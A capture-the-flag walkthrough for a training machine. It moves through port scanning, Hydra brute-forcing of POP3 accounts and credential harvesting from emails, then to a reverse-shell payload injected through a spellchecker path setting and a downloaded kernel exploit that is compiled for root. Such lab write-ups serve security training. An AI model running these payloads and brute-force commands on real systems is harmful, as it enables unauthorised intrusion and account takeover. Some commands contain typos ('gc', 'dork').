### Use nmap to scan the network for all ports. How many ports are open?
Run the following command shows that 4 ports are open.
```BASH
sudo nmap -sV -p- $ip
```
![alt text](image.png)

<pre>4</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Who needs to make sure they update their default password? Whats their password?
Using browser’s devs tools in the Inspector tab reveals that there is JavaScript file named `terminal.js`.  

![alt text](image-1.png)

Open terminal.js in debbuger tab. You will find a note left by Boris to Natalya, including credentials.

![alt text](image-2.png)

<pre>boris</pre>

Use [CyberChef](https://gchq.github.io/CyberChef/) to decode the string found in the script.

The decoded password is:  

![alt text](image-3.png)
<pre>InvincibleHack3r</pre>

<span style="line-height:0.5;">&nbsp;</span>


### If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?
First, try logging into POP3 using telnet:  

```BASH
telnet $ip 55007
```

If logging in with the current credentials shows that you lack privileges (or you receive an error), proceed with brute-force.Use Hydra to brute-force the POP3 credentials for user boris:
```BASH
hydra -l boris -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt $ip -s 55007 pop3
```

<pre>secret1!</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Inspect port 55007, what service is configured to use this port?
<pre>pop3</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What can you find on this service?
Log in as user boris using telnet:
```BASH
telnet $ip 55007
``` 

Then enter the following commands:
```BASH
USER boris
PASS secret1!
```  

![alt text](image-4.png)

List and read emails:
```BASH
LIST
RETR $message_id
```

![alt text](image-5.png)
<pre>emails</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What user can break Boris' codes?
![alt text](image-6.png)
<pre>natalya</pre>

Also, a third email reveals another user: Xenia.
![alt text](image-7.png)

Brute-force POP3 for user natalya using Hydra with a default credentials wordlist:
```BASH
hydra -l natalya -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt $ip -s 55007 pop3
```

<pre>bird</pre>

Use Natalya’s credentials to log in via telnet as before. In the second email obtained after logging in, you will see credentials for Xenia: 

![alt text](image-8.png)

<pre>xenia</pre>
<pre>RCP90rulez!</pre>

Additionally, note the internal domain provided:
<pre>severnaya-station.com/gnocertdir</pre>

This detail indicates you need to update the /etc/hosts file.
```BASH
nano /etc/hosts
```
![alt text](image-9.png)

<span style="line-height:0.5;">&nbsp;</span>

### Try using the credentials you found earlier. Which user can you login as?
Log in as Xenia.  

![alt text](image-10.png)
<pre>Xenia</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Have a poke around the site. What other user can you find?
You will find message exchanges between Xenia and Doak:

![alt text](image-11.png)  

<pre>Doak</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What was this users password?
Run Hydra on the POP3 service for user dork.

```BASH
hydra -l dork  -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt $ip -s 55007 pop3
```

<pre>goat</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the next user you can find from doak? What is this users password?
Doak has one message where credentials for dr_doak are provided:

![alt text](image-12.png)

<pre>dr_doak</pre>
<pre>4England!</pre>

Log in as dr_doak on the website. In dr_doak's personal files, you will see a file named `s3cret`.

![alt text](image-13.png)  

![alt text](image-14.png)

Go to `severnaya-station.com/dir007key/for-007.jpg` and download the image. Use exiftool on your local machine to inspect its metadata. The image description contains an encrypted string. Paste the value into CyberChef to decrypt it.

![alt text](image-17.png)  

![alt text](image-15.png)

<pre>xWinter1995x!</pre>

Return to the website and log in as admin using this password. Then, search for “aspell” in the site’s search input. You will discover that the aspell path can be exploited to obtain a reverse shell. 

Set up your Netcat Listener on Your Machine:  

```BASH
netcat -lnvp 4444
```
![alt text](image-18.png)

In the aspell path input field, provide the following payload:
```BASH
bash -c 'exec bash -i &>/dev/tcp/10.10.166.60/4444 <&1'
```
![alt text](image-25.png)

Then, force the spellchecker to run so the payload executes. Once you have a reverse shell, stabilize it:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![alt text](image-26.png)

### Whats the kernel version?
```BASH
uname -a
```

![alt text](image-27.png)

<pre>3.13.0-32-generic</pre>

### What development tools are installed on the machine?
### What is the root flag?

Download the [Linux Kernel 3.13.0 exploit](https://www.exploit-db.com/exploits/37292) on your machine. Before transferring the exploit to the target, you must edit the source file. The exploit normally contains a line such as:
```BASH
 lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```  

Since gcc is not available on the server but cc is, change this line to:
```BASH
 lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

Start a Python HTTP server on your attacker machine:
```BASH
python3 -m http.server 8000
```

On the target machine (using your reverse shell), download the exploit:
```BASH
wget http://10.10.166.60:8000/37292.c
```
![alt text](image-28.png)

Compile and run the exploit on the target:
```BASH
gc 37292.c -o lpe
./lpe
```

![alt text](image-29.png)

Once the exploit runs, change directory to root:
![alt text](image-30.png)

<pre>568628e0d993b1973adc718237da6e93</pre>
